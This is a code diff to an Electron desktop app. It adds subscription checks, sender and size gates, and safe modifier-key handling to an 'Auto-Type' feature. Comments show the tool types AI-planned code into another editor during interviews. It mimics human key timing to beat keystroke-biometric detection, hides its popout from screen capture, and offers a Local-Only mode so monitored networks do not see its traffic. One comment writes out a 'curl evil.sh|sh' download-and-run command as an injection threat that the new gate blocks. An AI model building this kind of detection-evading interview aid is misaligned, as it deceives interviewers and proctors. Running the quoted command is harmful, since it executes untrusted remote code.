+    console.log(`[auto-type] entitlement claim refreshed (${reason}): autoType=${claim.autoType} tier=${claim.tier} valid ${Math.round((claim.exp - Date.now()) / 3600000)}h`);
+    return true;
+  } catch (e) {
+    console.warn('[auto-type] entitlement claim refresh threw:', e && e.message);
+    return false;
+  }
+}
+
+// The token, in MEMORY ONLY — main has never persisted one (see the note on
+// payload.authToken in the handler) and must not start. This is a warm copy
+// of the last token a legitimate Auto-Type run handed us, so a refresh can
+// still happen when the renderer isn't in a state to be asked.
+let autoTypeKnownToken = null;
+function autoTypeRememberToken(authToken) {
+  if (typeof authToken === 'string' && authToken.length > 20) autoTypeKnownToken = authToken;
+}
+
+// Main PULLS the token; the renderer never pushes it. That direction is the
+// entire point — a refresh the renderer triggers is a refresh an attacker in
+// the renderer controls, and "the renderer says so" is the trust boundary
+// this work exists to remove. Reading localStorage off the page is not an
+// escalation: it is the same string the renderer already hands us on every
+// Auto-Type run, and a forged one buys nothing, because what we believe at
+// the end is the server's signature, not the token.
+async function autoTypeDiscoverToken() {
+  try {
+    const wc = mainWindow && !mainWindow.isDestroyed() ? mainWindow.webContents : null;
+    if (wc && !wc.isDestroyed() && !wc.isLoading()) {
+      const t = await wc.executeJavaScript(
+        "(() => { try { return localStorage.getItem('minicaai_token'); } catch (e) { return null; } })()"
+      );
+      if (typeof t === 'string' && t.length > 20) return t;
+    }
+  } catch (_) { /* window gone, page mid-navigation, renderer crashed — fine */ }
+  return autoTypeKnownToken;
+}
+
+// ── FIX for the user who has never been online ──
+// The probe only ever ran when Auto-Type was FIRST USED, so somebody who
+// bought Ultra, installed, turned Local-Only on and walked into an interview
+// got refused at the worst possible moment. Refreshing in the background
+// means any Ultra user who has EVER launched this app with a connection is
+// already carrying a signed claim by the time they need it.
+let autoTypeClaimRefreshTimer = null;
+function autoTypeStartEntitlementRefresh() {
+  // Idempotent: createMainWindow runs again on tray-restore and on macOS
+  // 'activate', and a second interval here would stack forever.
+  if (autoTypeClaimRefreshTimer) return;
+  const tick = async (reason) => {
+    try {
+      if (sessionActive) return;
+      const token = await autoTypeDiscoverToken();
+      if (!token) return;
+      await autoTypeRefreshSignedClaim(token, reason);
+    } catch (_) { /* nothing on this path is allowed to matter */ }
+  };
+  // Several early attempts, not one. A single 20-second shot misses the two
+  // commonest cold-start shapes: the renderer is still loading (no token to
+  // read yet), and the user signs in a couple of minutes AFTER launch — and
+  // missing either would park the next attempt six hours away, which on
+  // install-day is precisely the person this fix exists for. Retries are
+  // free once a claim lands: autoTypeClaimNeedsRefresh short-circuits on a
+  // local file read and never touches the network again.
+  //
+  // .catch() on a promise that already cannot reject is belt-and-suspenders,
+  // and cheap next to what an unhandled rejection looks like in main.
+  for (const delay of AT_CLAIM_STARTUP_DELAYS_MS) {
+    setTimeout(() => { tick('startup').catch(() => {}); }, delay);
+  }
+  autoTypeClaimRefreshTimer = setInterval(() => { tick('periodic').catch(() => {}); }, AT_CLAIM_REFRESH_INTERVAL_MS);
+}
+
+// The probe itself. Returns { status } — status 0 means we never got an
+// answer (network error / timeout), which is explicitly NOT a denial.
+async function autoTypeProbeEntitlement(authToken) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_ENTITLEMENT_PROBE_TIMEOUT_MS);
+  try {
+    const res = await fetch(`${API_BASE}/api/v1/ai/autotype-plan`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${authToken}`,
+        // Marks these in the server log as what they are — a gate check,
+        // not a planner call that mysteriously forgot to send code.
+        'X-Autotype-Entitlement-Probe': '1',
+      },
+      body: JSON.stringify({ entitlementProbe: true }),
+      signal: controller.signal,
+    });
+    // Drain the (tiny) body so the socket goes back to the pool instead of
+    // waiting on GC.
+    try { await res.text(); } catch (_) {}
+    return { status: res.status };
+  } catch (e) {
+    return { status: 0, error: e && e.message ? e.message : String(e) };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+// The decision. Never throws and never rejects: the caller fires this off
+// next to a countdown the user can cancel, and a dangling rejected promise
+// there would be an unhandled rejection on a perfectly normal abort.
+async function autoTypeVerifyEntitlement({ authToken, localOnly }) {
+  let key = null;
+  let cached = null;
+  // Set when a valid signed denial was seen and we fell through to the live
+  // probe anyway. It means "the last thing the server told us was no", which
+  // is the tie-breaker if the probe then fails to tell us anything.
+  let signedDenial = false;
+  try {
+    key = autoTypeIdentityKey(authToken);
+    cached = autoTypeCachedEntitlement(key);
+    // Keep a warm copy for the background refresher. This is the one hook
+    // that already exists for main to learn a token, so we use it rather
+    // than adding an IPC channel the renderer would have to call — a
+    // renderer-driven refresh is exactly the trust boundary being removed.
+    autoTypeRememberToken(authToken);
+
+    // ── The signed claim outranks everything below it ──
+    // In BOTH directions, and before the localOnly branch on purpose: a
+    // verified claim is the only artefact in this system the user cannot
+    // write for themselves, and checking it needs no network — which is
+    // precisely what Local-Only mode and hotel wifi need. Once one has ever
+    // been seen, the unsigned grant underneath is a compatibility fallback
+    // for servers that have no signing key yet, nothing more.
+    const signed = autoTypeReadSignedClaim(authToken);
+    if (signed && signed.claim.autoType === true) {
+      return {
+        allowed: true,
+        source: localOnly ? 'signed-claim-local-only' : 'signed-claim',
+        tier: signed.claim.tier || null,
+        expiresInMs: signed.claim.exp - Date.now(),
+      };
+    }
+    if (signed && signed.claim.autoType === false) {
+      // A SIGNED denial is authoritative in a way a 403 never is: a 403 could
+      // equally be an expired token or a server having a bad day, which is
+      // why the endpoint answers 200 with autoType:false instead of a status
+      // code. This is what makes a downgrade stop working promptly — drop the
+      // older unsigned grant so its seven-day window cannot outlive the
+      // subscription. The signed denial itself STAYS (it is the record).
+      autoTypeForgetEntitlement(key);
+      cached = null;   // dropped above; must not resurface on the degraded path
+      signedDenial = true;
+      // But a denial is a snapshot, and the person most likely to hit it is
+      // the person who just paid to make it false. Offline we have no way to
+      // know, so the denial stands. ONLINE we do: fall through to the live
+      // probe, which answers the current question rather than the one we
+      // cached up to an hour ago. It cuts both ways and that is the point —
+      // a downgraded account gets 403 from the same probe. Local-Only still
+      // returns here, because there the whole point is that no call happens.
+      if (localOnly || !authToken) {
+        return {
+          allowed: false,
+          reason: 'entitlement_denied',
+          source: 'signed-claim',
+          message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+        };
+      }
+    }
+
+    // Local-Only mode suppresses the network call BY DESIGN — see the
+    // localOnly comment at the top of the handler; on a monitored network
+    // the Railway call is itself the anomaly. So local-only runs on the
+    // cache alone, and a device that has never been verified is refused
+    // with something the user can actually act on.
+    if (localOnly) {
+      if (cached) return { allowed: true, source: 'cache-local-only', ageMs: cached.ageMs };
+      return {
+        allowed: false,
+        reason: 'entitlement_unverified',
+        message: 'Auto-Type needs a one-time online check. Turn Local-Only Auto-Type off once (or reconnect), run Auto-Type, and it will keep working offline for the next 7 days.',
+      };
+    }
+
+    // No token at all — nothing to probe with. Same rule as a network
+    // failure: fall back to the cache, refuse if there isn't one.
+    if (!authToken) {
+      if (cached) return { allowed: true, source: 'cache-no-token', ageMs: cached.ageMs };
+      return {
+        allowed: false,
+        reason: 'entitlement_signed_out',
+        message: 'Auto-Type is an Ultra feature — sign in so we can verify your plan.',
+      };
+    }
+
+    const probe = await autoTypeProbeEntitlement(authToken);
+    const status = probe.status;
+
+    if (status === 401) {
+      // Expired / revoked session. Not a tier verdict, so we deliberately do
+      // NOT drop the cached grant — this user may be Ultra with a stale
+      // token, and punishing them here would lock them out offline later.
+      return {
+        allowed: false,
+        reason: 'entitlement_signed_out',
+        message: 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.',
+        status,
+      };
+    }
+    if (status === 403 || status === 402) {
+      autoTypeForgetEntitlement(key);
+      // We only reach the probe when no signed claim was usable, so there is
+      // usually nothing to drop here — but an expired or wrong-`sub` claim
+      // could still be sitting in the file, and a live tier denial is proof
+      // it is worthless. Clearing it keeps the file honest.
+      autoTypeForgetSignedClaim(key);
+      return {
+        allowed: false,
+        reason: 'entitlement_denied',
+        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+        status,
+      };
+    }
+    if ((status >= 200 && status < 300) || status === 400 || status === 422) {
+      autoTypeRememberEntitlement(key);
+      // The live server just contradicted a signed denial we were holding —
+      // they upgraded. Replace the stale claim now rather than letting the
+      // hourly tick do it, so the NEXT run (which may be offline, or
+      // Local-Only) already has a signed allow to read. Fire-and-forget: the
+      // probe already answered this run, so nothing waits on it, and its own
+      // sessionActive gate still applies.
+      if (signedDenial) {
+        Promise.resolve(autoTypeRefreshSignedClaim(authToken, 'denial-overturned')).catch(() => {});
+      }
+      return { allowed: true, source: 'server', status };
+    }
+
+    // 404 (server predates the route), 429, 5xx, or status 0 (network /
+    // timeout). We learned nothing, so this is a grace-window question.
+    // Unless we were holding a signed denial: then the last thing the server
+    // actually said was no, and "we couldn't reach it" is not a reason to
+    // overturn that. Deny, and say why — the message has to be the denial,
+    // not the never-verified copy below, or someone who genuinely is not on
+    // Ultra gets told to check their connection.
+    if (signedDenial) {
+      return {
+        allowed: false,
+        reason: 'entitlement_denied',
+        source: 'signed-claim',
+        status,
+        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+      };
+    }
+    if (cached) return { allowed: true, source: 'cache-degraded', ageMs: cached.ageMs, status };
+    return {
+      allowed: false,
+      reason: 'entitlement_unverified',
+      message: `Auto-Type could not reach the licensing server (${status ? 'HTTP ' + status : (probe.error || 'network error')}), and this device has never completed an online Ultra check. Connect once and try again.`,
+      status,
+    };
+  } catch (e) {
+    // A bug in the check must not become a keystroke. Degrade to the same
+    // rule as a network failure: cache or refuse.
+    console.warn('[auto-type] entitlement check threw:', e && e.message);
+    if (cached) return { allowed: true, source: 'cache-check-threw', ageMs: cached.ageMs };
+    return {
+      allowed: false,
+      reason: 'entitlement_unverified',
+      message: 'Auto-Type could not verify your plan on this device. Connect to the internet once and try again.',
+    };
+  }
+}
+
+ipcMain.handle('auto-type:send', async (event, payload) => {
   console.log(`[auto-type] IPC received: payload.code=${payload && payload.code ? payload.code.length : 0} bytes, lang=${payload && payload.language || '?'}, skipLines=${payload && payload.skipLines || 0}`);
   const code = payload && typeof payload.code === 'string' ? payload.code : '';
   // skipLines lets the renderer (which ran OCR on the target editor) tell us
@@ -2789,6 +3679,20 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   autoTypePlanLog.record(_atRunId, { language, intendedCode: code, skipLines, localOnly });
   // P8-1: pin the owning CodeBlock's ID so broadcasts can be addressed.
   const blockId = payload && typeof payload.blockId === 'string' ? payload.blockId : null;
+  // ── Gate 0: who asked? ──
+  // First gate on purpose, so an untrusted sender gets the same answer no
+  // matter what state the engine is in. Anything that can run script in a
+  // renderer — a markdown/chat XSS, a compromised npm dependency, embedded
+  // content in a subframe — could otherwise ask us to type `curl evil.sh|sh`
+  // into whatever terminal the user alt-tabbed to, and we would hide our
+  // own window first so they never saw it happen.
+  if (!autoTypeSenderIsTrusted(event)) {
+    console.error('[auto-type] REFUSED: invoke did not come from the top frame of a window we own — keystroke injection blocked.');
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'untrusted_sender' });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    return { error: 'Auto-Type refused: that request did not come from the app window.' };
+  }
   if (autoTypeInFlight) {
     autoTypePlanLog.record(_atRunId, { earlyBail: 'already_in_progress' });
     try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
@@ -2800,6 +3704,18 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
     try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
     autoTypeCurrentRunId = null;
     return { error: 'Nothing to type.' };
+  }
+  // ── Gate 1: how much? ──
+  // payload.code arrived as an arbitrary-length string. The cap is not about
+  // sane files (a 500-line source file is ~15 KB) — it is about the fact
+  // that a keystroke stream with no end is one the user cannot get ahead of.
+  const codeBytes = Buffer.byteLength(code, 'utf8');
+  if (codeBytes > AT_MAX_CODE_BYTES) {
+    console.error(`[auto-type] REFUSED: code is ${codeBytes} bytes, over the ${AT_MAX_CODE_BYTES}-byte cap.`);
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'code_too_large', codeBytes });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    return { error: `Auto-Type refused: ${Math.round(codeBytes / 1024)} KB is far too much to type (limit ${Math.round(AT_MAX_CODE_BYTES / 1024)} KB).` };
   }
 
   autoTypeInFlight = true;
@@ -2825,9 +3741,24 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
     mouse = nut.mouse || null;
   } catch (e) {
     autoTypeInFlight = false;
+    // L21: this early return used to walk away from an open _pending entry.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'native_module_load_failed', error: e && e.message });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     console.error('[auto-type] native module load failed:', e && e.message);
     return { error: 'Native input module failed to load: ' + (e && e.message) };
   }
+
+  // ── Gate 2: did they pay? (fired now, decided before we hide) ──
+  // Started HERE rather than awaited here so the round-trip hides behind the
+  // 3-second countdown the user is already watching — on a normal run it
+  // costs zero visible time. But the DECISION is taken below, before
+  // mainWindow.hide() and long before any keystroke: a refused run must
+  // never leave the user staring at a vanished app mid-interview, and it
+  // must never put a single character into someone else's window.
+  // autoTypeVerifyEntitlement never rejects, so the abort path below can
+  // walk away from this promise without an unhandled rejection.
+  const entitlementCheck = autoTypeVerifyEntitlement({ authToken, localOnly });
 
   // Phase 1: countdown. Windows stay visible so the user can see the
   // timer and alt-tab to the target editor (or click to cancel).
@@ -2837,9 +3768,39 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   }
   if (autoTypeAbort) {
     autoTypeInFlight = false;
+    // L21: ditto — the user-cancel path leaked its _pending entry too.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_during_countdown', aborted: true });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     autoTypeBroadcast({ phase: 'done', aborted: true });
     return { aborted: true };
   }
+
+  // The entitlement verdict. Nothing has been hidden yet and nothing has
+  // been typed, so a refusal here is clean: log it, tell the user something
+  // they can act on, and leave the desktop exactly as we found it.
+  const entitlement = await entitlementCheck;
+  if (!entitlement.allowed) {
+    console.warn(`[auto-type] REFUSED by entitlement gate (${entitlement.reason}, status=${entitlement.status || 'n/a'}) — no window hidden, no keystrokes emitted.`);
+    autoTypePlanLog.record(_atRunId, {
+      earlyBail: entitlement.reason,
+      entitlement: { reason: entitlement.reason, status: entitlement.status || null, localOnly },
+    });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    autoTypeAbort = true;
+    autoTypeAbortReason = entitlement.reason;
+    autoTypeAbortDiagnostic = { hint: entitlement.message };
+    autoTypeInFlight = false;
+    autoTypeBroadcast({
+      phase: 'done',
+      aborted: true,
+      reason: entitlement.reason,
+      hint: entitlement.message,
+    });
+    return { aborted: true, reason: entitlement.reason };
+  }
+  console.log(`[auto-type] entitlement OK (source=${entitlement.source}${entitlement.status ? ', HTTP ' + entitlement.status : ''}${typeof entitlement.ageMs === 'number' ? ', cached ' + Math.round(entitlement.ageMs / 3600000) + 'h ago' : ''})`);
 
   // Phase 2: hide the main window so the user can see the target editor
   // underneath. We DO NOT hide the popout — it has setContentProtection
@@ -2931,6 +3892,10 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         reason: 'no_target_editor',
         hint: autoTypeAbortDiagnostic.hint,
       });
+      // L21: this return leaked its _pending log entry as well.
+      autoTypePlanLog.record(_atRunId, { earlyBail: 'no_target_editor', aborted: true, focusedProcName });
+      try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+      autoTypeCurrentRunId = null;
       return { aborted: true, reason: 'no_target_editor' };
     }
 
@@ -3055,6 +4020,17 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   // broken → diagnose" loop: the app self-reports instead of us guessing.
   let plannerLabel = 'deterministic-uia';     // overwritten as we go
   let plannerDetail = '';                     // human-readable "why"
+  // ── Mid-run entitlement revocation ──
+  // All three planner routes (/autotype-vision, /autotype-agent,
+  // /autotype-plan) sit behind the SAME requireTier('ultra') middleware, so a
+  // 401/402/403 from any of them is the server saying "not entitled" —
+  // exactly the answer Gate 2 asked for at the top, arriving late (token
+  // expired mid-run, subscription cancelled between the two calls, or a
+  // local-only run that never got to ask). It used to be swallowed as "the
+  // cloud planner is unavailable, use the deterministic fallback" and the
+  // keystrokes went out anyway. Now it stops the run — and it still lands
+  // BEFORE the typing loop, which starts well below this block.
+  let entitlementDeniedStatus = 0;
   if (usedUIA) {
     plannerLabel = 'deterministic-uia';
     plannerDetail = `UIA read the editor directly (skip ${effectiveSkipLines}/${effectiveSkipTrailing})`;
@@ -3166,6 +4142,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
             }
           } else {
             console.log(`[auto-type] vision endpoint HTTP ${visRes.status} — falling through to text agent`);
+            if (visRes.status === 401 || visRes.status === 402 || visRes.status === 403) entitlementDeniedStatus = visRes.status;
             // The single most common real failure: the app is calling a
             // server that doesn't have /autotype-vision (production not
             // deployed, or API_BASE wrong). Make it unmissable.
@@ -3219,6 +4196,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
           }
         } else {
           console.log(`[auto-type] agent endpoint HTTP ${agentRes.status} — trying Haiku fallback`);
+          if (agentRes.status === 401 || agentRes.status === 402 || agentRes.status === 403) entitlementDeniedStatus = agentRes.status;
         }
       } catch (agentErr) {
         console.warn('[auto-type] agent call threw, trying Haiku fallback:', agentErr && agentErr.message);
@@ -3244,6 +4222,16 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         });
         if (planRes.ok) {
           aiPlan = await planRes.json().catch(() => null);
+          // A 200 here is the tier gate confirming Ultra for this token just
+          // as surely as the preflight probe did — refresh the grace window
+          // so a user who runs Auto-Type daily never falls out of it.
+          autoTypeRememberEntitlement(autoTypeIdentityKey(authToken));
+        } else if (planRes.status === 401 || planRes.status === 402 || planRes.status === 403) {
+          // THE line. This used to fall through to "deterministic fallback"
+          // and type anyway, which made the only real server-side gate on
+          // the $159/mo feature a no-op.
+          console.error(`[auto-type] Haiku planner HTTP ${planRes.status} — ENTITLEMENT DENIED by the server; aborting the run.`);
+          entitlementDeniedStatus = planRes.status;
         } else if (planRes.status === 404 || planRes.status === 503) {
           console.warn(`[auto-type] Haiku planner HTTP ${planRes.status} — using deterministic fallback only (server may need redeploy)`);
           autoTypeBroadcast({
@@ -3410,12 +4398,56 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
     }
   }
 
+  // A planner route told us this account is not entitled. Stop here — this
+  // is still upstream of every keystroke — and put the window back, because
+  // by now we have hidden it. The message mirrors Gate 2's so the user sees
+  // one story regardless of which check caught it.
+  if (entitlementDeniedStatus) {
+    const denialHint = entitlementDeniedStatus === 401
+      ? 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.'
+      : 'Auto-Type is an Ultra feature, and the server says this account is not on the Ultra plan. Upgrade from Settings → Subscription to use it.';
+    if (entitlementDeniedStatus !== 401) {
+      const deniedKey = autoTypeIdentityKey(authToken);
+      autoTypeForgetEntitlement(deniedKey);
+      // Drop the SIGNED grant too. This is the one path where a live tier
+      // denial can arrive while a perfectly valid claim is still in the file
+      // — the claim was minted hours ago and the subscription ended since —
+      // and leaving it there would let Gate 2 wave the next run straight
+      // through on stale evidence. A 401 is not a tier verdict, so it does
+      // not touch either store.
+      autoTypeForgetSignedClaim(deniedKey);
+    }
+    console.error(`[auto-type] REFUSED mid-run: planner route returned HTTP ${entitlementDeniedStatus} — nothing typed.`);
+    restore.forEach(fn => { try { fn(); } catch (_) {} });
+    autoTypeAbort = true;
+    autoTypeAbortReason = entitlementDeniedStatus === 401 ? 'entitlement_signed_out' : 'entitlement_denied';
+    autoTypeAbortDiagnostic = { hint: denialHint };
+    autoTypePlanLog.record(_atRunId, {
+      earlyBail: autoTypeAbortReason,
+      entitlement: { reason: autoTypeAbortReason, status: entitlementDeniedStatus, localOnly, midRun: true },
+    });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    autoTypeInFlight = false;
+    autoTypeBroadcast({
+      phase: 'done',
+      aborted: true,
+      reason: autoTypeAbortReason,
+      hint: denialHint,
+    });
+    return { aborted: true, reason: autoTypeAbortReason };
+  }
+
   // UIA read can block up to 3.5s. If the user clicked cancel during that
   // wait, honor it now — don't broadcast 'typing' and don't start keystrokes.
   if (autoTypeAbort) {
     restore.forEach(fn => { try { fn(); } catch (_) {} });
     autoTypeBroadcast({ phase: 'done', aborted: true });
     autoTypeInFlight = false;
+    // L21: fourth of the four early returns that leaked a _pending entry.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_before_typing', aborted: true });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     return { aborted: true };
   }
 
@@ -3689,6 +4721,10 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         autoTypeAbort = true;
       }
     } finally {
+      // Before anything else: let go of every modifier. Each hold has its
+      // own finally, but this run just ended for SOME reason and the one
+      // state we must never hand back to the user is a stuck Shift or Ctrl.
+      try { await releaseAllModifiers(); } catch (_) {}
       restore.forEach(fn => { try { fn(); } catch (_) {} });
       // Capture the AFTER state for the run log before broadcasting done.
       // Best-effort: a fresh UIA read shows the editor as it sits post-typing.
@@ -3793,11 +4829,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       // P1a: dwell on every key in the sequence (Home, Down loop, Home, Right loop).
       try {
         const target = Math.max(1, Math.min(100000, cursorTargetLine));
-        await keyboard.pressKey(Key.LeftControl);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.Home);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftControl);
+        await withHeldKey(keyboard, Key.LeftControl, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.Home);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(30, 60);
         await autoTypeArrowRun(keyboard, Key.Down, target - 1);
         // True column 0 before counting Rights — a single Home stops at the
@@ -3816,11 +4852,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       }
     } else if (cursorAction === 'move_to_end') {
       try {
-        await keyboard.pressKey(Key.LeftControl);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.End);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftControl);
+        await withHeldKey(keyboard, Key.LeftControl, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.End);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(45, 88);
         console.log(`[auto-type] cursor: moved to end-of-file via Ctrl+End`);
       } catch (kErr) {
@@ -3872,11 +4908,11 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       try {
         await autoTypePressWithDwell(keyboard, Key.Home);
         await autoTypeNavSleep(14, 32);
-        await keyboard.pressKey(Key.LeftShift);
-        await autoTypeNavSleep(5, 14);
-        await autoTypePressWithDwell(keyboard, Key.End);
-        await autoTypeNavSleep(5, 14);
-        await keyboard.releaseKey(Key.LeftShift);
+        await withHeldKey(keyboard, Key.LeftShift, async () => {
+          await autoTypeNavSleep(5, 14);
+          await autoTypePressWithDwell(keyboard, Key.End);
+          await autoTypeNavSleep(5, 14);
+        });
         await autoTypeNavSleep(14, 32);
         await autoTypePressWithDwell(keyboard, Key.Delete);
         await autoTypeNavSleep(22, 45);
@@ -4192,6 +5228,9 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       autoTypeAbort = true;
     }
   } finally {
+    // Same sweep as the multi-op path above, for the same reason — this is
+    // the last code that runs before the user gets their keyboard back.
+    try { await releaseAllModifiers(); } catch (_) {}
     restore.forEach(fn => { try { fn(); } catch (_) {} });
     // Capture the AFTER state for the single-region path's run log.
     try {
@@ -4703,11 +5742,11 @@ async function captureScreenForVision() {
 // correct in both cases and needs no prediction about the editor.
 async function autoTypeLineBreak(keyboard, Key) {
   const shiftEnd = async () => {
-    await keyboard.pressKey(Key.LeftShift);
-    await autoTypeNavSleep(5, 14);
-    await autoTypePressWithDwell(keyboard, Key.End);
-    await autoTypeNavSleep(5, 14);
-    await keyboard.releaseKey(Key.LeftShift);
+    await withHeldKey(keyboard, Key.LeftShift, async () => {
+      await autoTypeNavSleep(5, 14);
+      await autoTypePressWithDwell(keyboard, Key.End);
+      await autoTypeNavSleep(5, 14);
+    });
     await autoTypeNavSleep(14, 32);
   };
   await shiftEnd();                                       // 1
@@ -4748,11 +5787,11 @@ async function autoTypeCollapseSelection(keyboard, Key) {
 // (planAutoTypeFromUIA's `cursor_mid_line`), so it just collapses instead.
 async function autoTypeConsumeTrailingResidue(keyboard, Key) {
   try {
-    await keyboard.pressKey(Key.LeftShift);
-    await autoTypeNavSleep(5, 14);
-    await autoTypePressWithDwell(keyboard, Key.End);
-    await autoTypeNavSleep(5, 14);
-    await keyboard.releaseKey(Key.LeftShift);
+    await withHeldKey(keyboard, Key.LeftShift, async () => {
+      await autoTypeNavSleep(5, 14);
+      await autoTypePressWithDwell(keyboard, Key.End);
+      await autoTypeNavSleep(5, 14);
+    });
     await autoTypeNavSleep(10, 22);
     await typeCharHumanly(keyboard, Key, ' ');
     await autoTypeNavSleep(18, 40);
@@ -4952,9 +5991,9 @@ async function autoTypeArrowRun(keyboard, key, count) {
   await autoTypeSleep(190 + Math.random() * 130);
   for (let i = 1; i < count; i++) {
     if (autoTypeAbort) return;
-    await keyboard.pressKey(key);
-    await autoTypeSleep(7 + Math.random() * 7);
-    await keyboard.releaseKey(key);
+    await withHeldKey(keyboard, key, async () => {
+      await autoTypeSleep(7 + Math.random() * 7);
+    });
     await autoTypeSleep(19 + Math.random() * 15);
   }
   // The beat after letting go, before doing anything with the caret.
@@ -5035,11 +6074,11 @@ async function autoTypeJumpToLine(target, ctx) {
     beforeName = b ? String(b.elementName ?? '') : null;
   } catch (_) { beforeName = null; }
 
-  await keyboard.pressKey(Key.LeftControl);
-  await autoTypeNavSleep(5, 14);
-  await autoTypePressWithDwell(keyboard, Key.G);
-  await autoTypeNavSleep(5, 14);
-  await keyboard.releaseKey(Key.LeftControl);
+  await withHeldKey(keyboard, Key.LeftControl, async () => {
+    await autoTypeNavSleep(5, 14);
+    await autoTypePressWithDwell(keyboard, Key.G);
+    await autoTypeNavSleep(5, 14);
+  });
   // The widget has to render before it can be read.
   await autoTypeSleep(260 + Math.random() * 140);
 
@@ -5227,11 +6266,11 @@ async function navigateToDocLine(lineNum, ctx) {
   // Ctrl+Home combo — hold Ctrl, press Home WITH DWELL (P1a), release Home,
   // release Ctrl. Real human key dwell of ~85ms instead of the previous
   // 5-14ms — closes the #1 keystroke-biometric fingerprint signal.
-  await keyboard.pressKey(Key.LeftControl);
-  await autoTypeNavSleep(5, 14);
-  await autoTypePressWithDwell(keyboard, Key.Home);
-  await autoTypeNavSleep(5, 14);
-  await keyboard.releaseKey(Key.LeftControl);
+  await withHeldKey(keyboard, Key.LeftControl, async () => {
+    await autoTypeNavSleep(5, 14);
+    await autoTypePressWithDwell(keyboard, Key.Home);
+    await autoTypeNavSleep(5, 14);
+  });
   await autoTypeNavSleep(30, 60);
   // Counted Downs — deterministic landing line — but at key-repeat cadence
   // once it's more than a hop. See autoTypeArrowRun.
@@ -5451,17 +6490,19 @@ async function autoTypeFixIndentation(lines, startLine, fromLine, ctx) {
 async function selectLineRangeContent(s, e, ctx) {
   const { keyboard, Key } = ctx;
   const span = Math.max(0, (e | 0) - (s | 0));
-  await keyboard.pressKey(Key.LeftShift);
-  await autoTypeHumanNavSleep();
   // Shift stays held across the run — that's the natural pattern for range
   // selection, and holding Shift+Down is exactly what a person does to grab
   // a block. autoTypeArrowRun only touches the arrow key, so the modifier
   // is unaffected; it just stops the selection being tapped out one
   // deliberate row at a time on a 30-line range.
-  await autoTypeArrowRun(keyboard, Key.Down, span);
-  await autoTypePressWithDwell(keyboard, Key.End);
-  await autoTypeHumanNavSleep();
-  await keyboard.releaseKey(Key.LeftShift);
+  // This is the LONGEST hold in the file — a whole arrow run plus an End —
+  // so it is also the one with the most chances to throw partway through.
+  await withHeldKey(keyboard, Key.LeftShift, async () => {
+    await autoTypeHumanNavSleep();
+    await autoTypeArrowRun(keyboard, Key.Down, span);
+    await autoTypePressWithDwell(keyboard, Key.End);
+    await autoTypeHumanNavSleep();
+  });
   await autoTypeNavSleep(10, 22);
 }
 
@@ -5829,11 +6870,11 @@ async function executeMultiOpPlan(operations, ctx) {
       // whenever the editor did not auto-indent (see autoTypeLineBreak).
       await autoTypePressWithDwell(keyboard, Key.Home);
       await autoTypeNavSleep(10, 22);
-      await keyboard.pressKey(Key.LeftShift);
-      await autoTypeNavSleep(4, 10);
-      await autoTypePressWithDwell(keyboard, Key.End);
-      await autoTypeNavSleep(4, 10);
-      await keyboard.releaseKey(Key.LeftShift);
+      await withHeldKey(keyboard, Key.LeftShift, async () => {
+        await autoTypeNavSleep(4, 10);
+        await autoTypePressWithDwell(keyboard, Key.End);
+        await autoTypeNavSleep(4, 10);
+      });
       await autoTypeNavSleep(10, 22);
       const lines = String(op.text || '').split('\n');
       await typeLinesHumanized(lines, ctx);
